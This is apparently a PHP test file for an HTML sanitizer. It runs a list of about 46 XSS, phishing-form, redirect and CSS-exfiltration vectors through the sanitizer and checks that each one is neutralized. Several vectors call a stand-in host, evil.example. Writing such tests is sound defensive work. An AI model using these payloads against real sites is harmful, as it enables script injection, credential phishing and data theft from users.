<?php

declare(strict_types=1);

// Attack vectors against the sanitizing (doc/security.md, section 2). Every vector is sanitized and the result is
// re-parsed and checked structurally; a few vectors additionally check for a specific expected result.

$attackVectors = [
  'script element' => '<script>alert(1)</script><p>text</p>',
  'event handler' => '<img src=x onerror=alert(1)>',
  'javascript link' => '<a href="javascript:alert(1)">x</a>',
  'javascript link with entity newline' => '<a href="java&#x0A;script:alert(1)">x</a>',
  'javascript link with tab entity' => '<IMG SRC="jav&#x09;ascript:alert(1)">',
  'javascript link mixed case and space' => '<a href=" JaVaScRiPt:alert(1)">x</a>',
  'vbscript link' => '<a href="vbscript:msgbox(1)">x</a>',
  'data html link' => '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  'svg with onload' => '<svg onload=alert(1)><circle r="1"/></svg>',
  'svg as data image' => '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
  'math mutation xss' => '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  'noscript mutation xss' => '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  'template content' => '<template><script>alert(1)</script></template>',
  'iframe with javascript' => '<iframe src="javascript:alert(1)"></iframe>',
  'iframe with srcdoc' => '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  'iframe to unknown host' => '<iframe src="https://evil.example/"></iframe>',
  'object' => '<object data="javascript:alert(1)"></object>',
  'embed' => '<embed src="data:text/html,<script>alert(1)</script>">',
  'phishing form' => '<form action="https://evil.example/"><input name="password"><button formaction="https://evil.example/">OK</button></form>',
  'base element' => '<base href="https://evil.example/"><a href="/x">x</a>',
  'meta refresh' => '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
  'link stylesheet' => '<link rel="stylesheet" href="https://evil.example/x.css">',
  'closing body and html' => '<p>a</p></div></body></html><script>alert(1)</script>',
  'comment' => '<!-- <script>alert(1)</script> --><p>t</p>',
  'video poster javascript' => '<video poster="javascript:alert(1)" src="https://quelle.example/v.mp4"></video>',
  'details ontoggle' => '<details open ontoggle=alert(1)><summary>x</summary></details>',
  'data attribute with javascript' => '<div data-x="javascript:alert(1)">x</div>',
  'srcset with javascript' => '<img src="https://quelle.example/a.jpg" srcset="javascript:alert(1) 1x, https://quelle.example/b.jpg 2x">',
  'dom clobbering by id and name' => '<div id="ajaxurl">x</div><img name="cookie" src="https://quelle.example/a.jpg">',
  'target top' => '<a href="https://evil.example/" target="_top">x</a>',
  'style url javascript' => '<div style="background:url(javascript:alert(1))">x</div>',
  'style expression' => '<div style="width:expression(alert(1))">x</div>',
  'style overlay' => '<div style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>',
  'style tracking url' => '<div style="background:url(https://evil.example/track.png)">x</div>',
  'style with escape' => '<div style="background:u\\72l(https://evil.example/x)">x</div>',
  'style with comment trick' => '<div style="background:url/**/(https://evil.example/x)">x</div>',
  'stylesheet import' => '<style>@import url(https://evil.example/x.css); body{background:red}</style>',
  'stylesheet attribute exfiltration' => '<style>input[value^="a"]{background:url(https://evil.example/a)}</style>',
  'stylesheet escape' => '<style>\\0040import "x";</style>',
  'stylesheet breakout' => '<style>p{color:red}</style ><img src=x onerror=alert(1)>',
  'stylesheet overlay' => '<style>.x{position:fixed;inset:0}</style>',
  'stylesheet font face' => '<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>',
  'stylesheet unscoped body' => '<style>body,html{display:none}</style>',
  'stylesheet malformed' => '<style>}p{color:red}</style>',
  'entity encoded script' => '&lt;script&gt;alert(1)&lt;/script&gt;',
  'xlink' => '<a xlink:href="javascript:alert(1)">x</a>',
];

foreach ($attackVectors as $description => $vector) {
  $output = sanitizeForTest($vector);
  $problems = findSecurityProblems($output);
  TestRun::check(count($problems) === 0, 'attack vector "' . $description . '" is neutralized', implode("\n", $problems) . "\noutput: " . $output);
}

// Specific expectations for some vectors.
TestRun::check(
  !str_contains(strtolower(sanitizeForTest($attackVectors['comment'])), 'script'),
  'comments are removed completely'
);
TestRun::check(
  str_contains(sanitizeForTest($attackVectors['dom clobbering by id and name']), 'id="kra-1-ajaxurl"'),
  'ids are prefixed against DOM clobbering'
);
TestRun::check(
  str_contains(sanitizeForTest($attackVectors['entity encoded script']), '&lt;script&gt;'),
  'entity encoded text stays text'
);
TestRun::check(
  str_contains(sanitizeForTest($attackVectors['stylesheet unscoped body']), '#kornsw-ra-1,#kornsw-ra-1{display:none}'),
  'body/html rules are redirected to the wrapper',
  sanitizeForTest($attackVectors['stylesheet unscoped body'])
);
TestRun::check(
  str_contains(sanitizeForTest($attackVectors['stylesheet overlay']), 'inset:0')
    && !str_contains(sanitizeForTest($attackVectors['stylesheet overlay']), 'fixed'),
  'position fixed is dropped, other declarations stay',
  sanitizeForTest($attackVectors['stylesheet overlay'])
);
